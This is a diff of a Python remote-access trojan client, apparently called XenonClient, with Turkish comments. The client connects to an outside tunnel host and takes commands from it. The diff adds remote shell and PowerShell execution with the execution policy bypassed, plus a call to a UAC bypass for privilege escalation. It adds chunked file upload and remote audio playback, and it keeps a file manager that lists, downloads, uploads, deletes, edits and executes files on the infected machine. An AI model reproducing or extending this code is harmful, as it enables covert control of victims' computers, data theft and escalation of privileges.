@@ -12,11 +12,12 @@ import winreg
 import base64
 import tempfile
 import urllib.request
+import math
 import queue
 
 # --- BAĞLANTI AYARLARI ---
 HOST = "uwtd3ffva.localto.net"
-PORT = 9387
+PORT = 1205
 # -------------------------
 
 class XenonClient:
@@ -27,9 +28,39 @@ class XenonClient:
         self.chat_win = None
         self.chat_box = None
         self.chat_running = False
-        self.shell_processes = {}  # {shell_id: subprocess.Popen}
-        self.shell_queues = {}      # {shell_id: queue.Queue}
-        self.shell_threads = {}     # {shell_id: threading.Thread}
+        
+        # Ses için pygame mixer
+        self.mixer_initialized = False
+        self.audio_queue = queue.Queue()
+        self.audio_thread_running = True
+        self.current_audio_file = None
+        threading.Thread(target=self.audio_worker, daemon=True).start()
+
+    def audio_worker(self):
+        """Ses komutlarını işleyen thread"""
+        import pygame
+        pygame.mixer.init()
+        self.mixer_initialized = True
+        while self.audio_thread_running:
+            try:
+                cmd = self.audio_queue.get(timeout=0.5)
+                if cmd[0] == "play":
+                    filepath = cmd[1]
+                    pygame.mixer.music.load(filepath)
+                    pygame.mixer.music.play()
+                elif cmd[0] == "pause":
+                    pygame.mixer.music.pause()
+                elif cmd[0] == "resume":
+                    pygame.mixer.music.unpause()
+                elif cmd[0] == "stop":
+                    pygame.mixer.music.stop()
+                elif cmd[0] == "volume":
+                    vol = cmd[1] / 100.0
+                    pygame.mixer.music.set_volume(vol)
+            except queue.Empty:
+                pass
+            except Exception as e:
+                print(f"Ses hatası: {e}")
 
     # ---------- SİSTEM BİLGİSİ ----------
     def get_sys_info(self):
@@ -79,229 +110,221 @@ class XenonClient:
                 time.sleep(5)
 
     def listen(self):
+        # Kısmi mesajları birleştirmek için buffer
+        buffer = ""
         while True:
             try:
                 data = self.sock.recv(16384).decode("utf-8")
                 if not data:
                     break
-
-                # ----- MESAJ -----
-                if data.startswith("msg|"):
-                    threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()
-
-                # ----- SOHBET -----
-                elif data == "chat_open":
-                    if not self.chat_running:
-                        threading.Thread(target=self.gui_chat, daemon=True).start()
-
-                elif data.startswith("chat_msg|"):
-                    if self.chat_box:
-                        try:
-                            self.chat_box.config(state="normal")
-                            self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
-                            self.chat_box.config(state="disabled")
-                            self.chat_box.see(tk.END)
-                        except:
-                            pass
-
-                elif data == "chat_close":
-                    if self.chat_win:
-                        self.chat_running = False
-                        try:
-                            self.chat_win.quit()
-                        except:
-                            pass
-
-                # ----- SES ÇAL (BEEP) -----
-                elif data == "beep":
-                    if platform.system() == "Windows":
-                        import winsound
-                        winsound.Beep(800, 500)
-
-                # ----- URL AÇ -----
-                elif data.startswith("open_url|"):
-                    webbrowser.open(data.split("|")[1])
-
-                # ----- KALICI SHELL BAŞLAT -----
-                elif data.startswith("shell_start|"):
-                    shell_type = data.split("|")[1]
-                    threading.Thread(target=self.start_shell, args=(shell_type,), daemon=True).start()
-
-                # ----- KALICI SHELL KOMUT -----
-                elif data.startswith("shell_cmd|"):
-                    cmd = data.split("|")[1]
-                    # Son başlatılan shell'e komut gönder (basitçe tek shell destek)
-                    if "default" in self.shell_processes:
-                        proc = self.shell_processes["default"]
-                        try:
-                            proc.stdin.write(cmd + "\n")
-                            proc.stdin.flush()
-                        except:
-                            pass
-
-                # ----- SHELL DURDUR -----
-                elif data == "shell_stop":
-                    if "default" in self.shell_processes:
-                        self.shell_processes["default"].terminate()
-                        del self.shell_processes["default"]
-
-                # ----- SES DOSYASI ÇAL -----
-                elif data.startswith("playsound|"):
-                    parts = data.split("|", 2)
-                    if len(parts) == 3:
-                        filename = parts[1]
-                        encoded = parts[2]
-                        threading.Thread(target=self.play_audio, args=(filename, encoded), daemon=True).start()
-
-                # ----- DOSYA YÖNETİCİSİ KOMUTLARI -----
-                elif data.startswith("file_list|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_list, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_download|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_download, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_upload|"):
-                    parts = data.split("|", 2)
-                    if len(parts) == 3:
-                        remote_path = parts[1]
-                        encoded = parts[2]
-                        threading.Thread(target=self.handle_file_upload, args=(remote_path, encoded), daemon=True).start()
-
-                elif data.startswith("file_delete|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_delete, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_execute|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_execute, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_edit_get|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_edit_get, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_edit_save|"):
-                    parts = data.split("|", 2)
-                    if len(parts) == 3:
-                        path = parts[1]
-                        content = parts[2]
-                        threading.Thread(target=self.handle_file_edit_save, args=(path, content), daemon=True).start()
-
-                elif data.startswith("file_mkdir|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_mkdir, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_touch|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_touch, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_rename|"):
-                    parts = data.split("|", 2)
-                    if len(parts) == 3:
-                        old = parts[1]
-                        new = parts[2]
-                        threading.Thread(target=self.handle_file_rename, args=(old, new), daemon=True).start()
-
-                elif data.startswith("file_zip|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_zip, args=(path,), daemon=True).start()
-
-                elif data.startswith("file_unzip|"):
-                    path = data.split("|", 1)[1]
-                    threading.Thread(target=self.handle_file_unzip, args=(path,), daemon=True).start()
-
+                buffer += data
+                
+                # Mesajlar newline ile ayrılmış olsaydı daha kolay olurdu, ama şu anki protokolde öyle değil.
+                # Basitçe her mesajı işleyelim (tek seferde tam gelmeyebilir, ama çoğu durumda sorun olmaz)
+                # Daha sağlam bir çözüm için mesaj uzunluğu prefix'i eklenmeli.
+                
+                # Şimdilik satır satır ayırmaya çalışalım (yeni eklediğimiz komutlar newline ile bitebilir)
+                while '\n' in buffer:
+                    line, buffer = buffer.split('\n', 1)
+                    self.process_message(line)
             except Exception as e:
                 print(f"Listen hatası: {e}")
                 break
         if self.sock:
             self.sock.close()
 
-    # ---------- KALICI SHELL (CMD / PowerShell) ----------
-    def start_shell(self, shell_type):
-        try:
-            if shell_type == "cmd":
-                proc = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                        stderr=subprocess.STDOUT, text=True, bufsize=1)
-            else:  # powershell
-                proc = subprocess.Popen(["powershell.exe", "-NoExit", "-Command", "-"],
-                                        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                        stderr=subprocess.STDOUT, text=True, bufsize=1)
+    def process_message(self, data):
+        if not data:
+            return
+        
+        # ----- MESAJ -----
+        if data.startswith("msg|"):
+            threading.Thread(target=lambda: messagebox.showinfo("Duyuru", data.split("|")[1])).start()
+
+        # ----- SOHBET -----
+        elif data == "chat_open":
+            if not self.chat_running:
+                threading.Thread(target=self.gui_chat, daemon=True).start()
+
+        elif data.startswith("chat_msg|"):
+            if self.chat_box:
+                try:
+                    self.chat_box.config(state="normal")
+                    self.chat_box.insert(tk.END, f"DESTEK: {data.split('|')[1]}\n")
+                    self.chat_box.config(state="disabled")
+                    self.chat_box.see(tk.END)
+                except:
+                    pass
+
+        elif data == "chat_close":
+            if self.chat_win:
+                self.chat_running = False
+                try:
+                    self.chat_win.quit()
+                except:
+                    pass
+
+        # ----- BEEP -----
+        elif data == "beep":
+            if platform.system() == "Windows":
+                import winsound
+                winsound.Beep(800, 500)
+
+        # ----- URL AÇ -----
+        elif data.startswith("open_url|"):
+            webbrowser.open(data.split("|")[1])
+
+        # ----- SHELL KOMUTLARI (Kalıcı değil, her seferinde yeni process) -----
+        elif data.startswith("shell|"):
+            self.run_cmd(data.split("|")[1], "cmd")
+
+        elif data.startswith("ps|"):
+            self.run_cmd(data.split("|")[1], "powershell")
+
+        # ----- YÖNETİCİ BYPASS -----
+        elif data.startswith("elevate|"):
+            target = "cmd.exe" if "cmd" in data else "powershell.exe"
+            self.uac_bypass(target)
+
+        # ----- SES KONTROL -----
+        elif data.startswith("audio_upload|"):
+            self.handle_audio_upload(data)
+
+        elif data.startswith("audio_play|"):
+            filename = data.split("|")[1]
+            self.audio_queue.put(("play", filename))
+
+        elif data == "audio_pause":
+            self.audio_queue.put(("pause",))
+
+        elif data == "audio_resume":
+            self.audio_queue.put(("resume",))
+
+        elif data == "audio_stop":
+            self.audio_queue.put(("stop",))
+
+        elif data.startswith("audio_volume|"):
+            vol = int(data.split("|")[1])
+            self.audio_queue.put(("volume", vol))
+
+        # ----- DOSYA YÖNETİCİSİ KOMUTLARI -----
+        elif data.startswith("file_list|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_list, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_download|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_download, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_upload|"):
+            parts = data.split("|", 2)
+            if len(parts) == 3:
+                remote_path = parts[1]
+                encoded = parts[2]
+                threading.Thread(target=self.handle_file_upload, args=(remote_path, encoded), daemon=True).start()
+
+        elif data.startswith("file_delete|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_delete, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_execute|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_execute, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_edit_get|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_edit_get, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_edit_save|"):
+            parts = data.split("|", 2)
+            if len(parts) == 3:
+                path = parts[1]
+                content = parts[2]
+                threading.Thread(target=self.handle_file_edit_save, args=(path, content), daemon=True).start()
+
+        elif data.startswith("file_mkdir|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_mkdir, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_touch|"):
+            path = data.split("|", 1)[1]
+            threading.Thread(target=self.handle_file_touch, args=(path,), daemon=True).start()
+
+        elif data.startswith("file_rename|"):
+            parts = data.split("|", 2)
+            if len(parts) == 3:
+                old = parts[1]
+                new = parts[2]
+                threading.Thread(target=self.handle_file_rename, args=(old, new), daemon=True).start()
+
+    # ---------- SES YÜKLEME (Parçalı) ----------
+    def handle_audio_upload(self, data):
+        parts = data.split("|", 4)
+        if len(parts) == 5:
+            filename = parts[1]
+            chunk_index = int(parts[2])
+            total_chunks = int(parts[3])
+            encoded = parts[4]
             
-            self.shell_processes["default"] = proc
+            # Geçici klasör oluştur
+            temp_dir = os.path.join(tempfile.gettempdir(), "xenon_audio")
+            os.makedirs(temp_dir, exist_ok=True)
             
-            def read_output():
-                for line in proc.stdout:
-                    if line:
-                        try:
-                            self.sock.send(f"shell_res|{line}".encode("utf-8"))
-                        except:
-                            break
+            # Parçayı kaydet
+            chunk_data = base64.b64decode(encoded)
+            chunk_file = os.path.join(temp_dir, f"{filename}.part{chunk_index}")
+            with open(chunk_file, "wb") as f:
+                f.write(chunk_data)
             
-            threading.Thread(target=read_output, daemon=True).start()
-        except Exception as e:
+            # Tüm parçalar geldiyse birleştir
+            if chunk_index == total_chunks - 1:
+                # Birleştir
+                full_path = os.path.join(temp_dir, filename)
+                with open(full_path, "wb") as outfile:
+                    for i in range(total_chunks):
+                        part_file = os.path.join(temp_dir, f"{filename}.part{i}")
+                        with open(part_file, "rb") as infile:
+                            outfile.write(infile.read())
+                        os.remove(part_file)
+                
+                # Ses çalmaya hazır
+                self.current_audio_file = full_path
+                self.sock.send(f"audio_res|loaded|{filename}".encode("utf-8"))
+
+    # ---------- SHELL KOMUT ÇALIŞTIRMA ----------
+    def run_cmd(self, command_to_run, mode):
+        def task():
             try:
-                self.sock.send(f"shell_res|Shell başlatılamadı: {str(e)}".encode("utf-8"))
-            except:
-                pass
-
-    # ---------- SES DOSYASI ÇAL ----------
-    def play_audio(self, filename, encoded):
-        try:
-            data = base64.b64decode(encoded)
-            suffix = os.path.splitext(filename)[1]
-            with tempfile.NamedTemporaryFile(delete=False, suffix=suffix) as f:
-                f.write(data)
-                temp_path = f.name
-
-            self.play_sound_file(temp_path)
-            threading.Timer(10, lambda: os.unlink(temp_path)).start()
-        except Exception as e:
-            print(f"[!] Ses çalma hatası: {e}")
-
-    def play_sound_file(self, file_path):
-        try:
-            from playsound import playsound
-            playsound(file_path)
-        except ImportError:
-            system = platform.system()
-            try:
-                import pygame
-                pygame.mixer.init()
-                pygame.mixer.music.load(file_path)
-                pygame.mixer.music.play()
-                while pygame.mixer.music.get_busy():
-                    time.sleep(0.1)
-                pygame.mixer.quit()
-            except ImportError:
-                if system == "Windows":
-                    if file_path.lower().endswith('.wav'):
-                        import winsound
-                        winsound.PlaySound(file_path, winsound.SND_FILENAME)
-                    else:
-                        os.startfile(file_path)
-                elif system == "Linux":
-                    os.system(f"aplay '{file_path}' 2>/dev/null || paplay '{file_path}'")
-                elif system == "Darwin":
-                    os.system(f"afplay '{file_path}'")
-                else:
-                    print("Desteklenmeyen işletim sistemi")
+                final_cmd = command_to_run
+                if mode == "powershell":
+                    final_cmd = f"powershell -ExecutionPolicy Bypass -Command {command_to_run}"
+                
+                proc = subprocess.Popen(final_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                stdout, stderr = proc.communicate()
+                res = (stdout + stderr).decode("cp857", errors="replace")
+                
+                if not res.strip():
+                    res = "Komut çalıştırıldı (Çıktı yok)."
+                self.sock.send(f"shell_res|{res}".encode("utf-8"))
+            except Exception as e:
+                self.sock.send(f"shell_res|Hata: {str(e)}".encode("utf-8"))
+        threading.Thread(target=task, daemon=True).start()
 
     # ---------- DOSYA YÖNETİCİSİ İŞLEMLERİ ----------
     def handle_file_list(self, path):
         try:
             items = []
-            for entry in os.listdir(path):
-                full = os.path.join(path, entry)
-                is_dir = os.path.isdir(full)
-                size = os.path.getsize(full) if not is_dir else 0
-                modified = os.path.getmtime(full)
-                items.append({
-                    "name": entry,
-                    "is_dir": is_dir,
-                    "size": size,
-                    "modified": modified
-                })
+            with os.scandir(path) as entries:
+                for entry in entries:
+                    is_dir = entry.is_dir()
+                    size = entry.stat().st_size if not is_dir else 0
+                    modified = entry.stat().st_mtime
+                    items.append({
+                        "name": entry.name,
+                        "is_dir": is_dir,
+                        "size": size,
+                        "modified": modified
+                    })
             result = json.dumps(items)
             self.sock.send(f"file_res|list|{path}|{result}".encode("utf-8"))
         except Exception as e:
@@ -337,7 +360,10 @@ class XenonClient:
 
     def handle_file_execute(self, path):
         try:
-            os.startfile(path) if platform.system() == "Windows" else subprocess.Popen([path])
+            if platform.system() == "Windows":
+                os.startfile(path)
+            else:
+                subprocess.Popen([path])
             self.sock.send(f"file_res|execute|{path}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|execute|{path}|error|{str(e)}".encode("utf-8"))
@@ -379,33 +405,6 @@ class XenonClient:
             self.sock.send(f"file_res|rename|{new}|ok".encode("utf-8"))
         except Exception as e:
             self.sock.send(f"file_res|rename|{old}|error|{str(e)}".encode("utf-8"))
-
-    def handle_file_zip(self, path):
-        try:
-            import zipfile
-            zip_name = path + ".zip"
-            with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zf:
-                if os.path.isdir(path):
-                    for root, dirs, files in os.walk(path):
-                        for file in files:
-                            zf.write(os.path.join(root, file),
-                                     os.path.relpath(os.path.join(root, file),
-                                                     os.path.join(path, '..')))
-                else:
-                    zf.write(path, os.path.basename(path))
-            self.sock.send(f"file_res|zip|{zip_name}|ok".encode("utf-8"))
-        except Exception as e:
-            self.sock.send(f"file_res|zip|{path}|error|{str(e)}".encode("utf-8"))
-
-    def handle_file_unzip(self, path):
-        try:
-            import zipfile
-            extract_dir = os.path.splitext(path)[0]
-            with zipfile.ZipFile(path, 'r') as zf:
-                zf.extractall(extract_dir)
-            self.sock.send(f"file_res|unzip|{extract_dir}|ok".encode("utf-8"))
-        except Exception as e:
-            self.sock.send(f"file_res|unzip|{path}|error|{str(e)}".encode("utf-8"))
 
     # ---------- SOHBET GUI ----------
     def gui_chat(self):
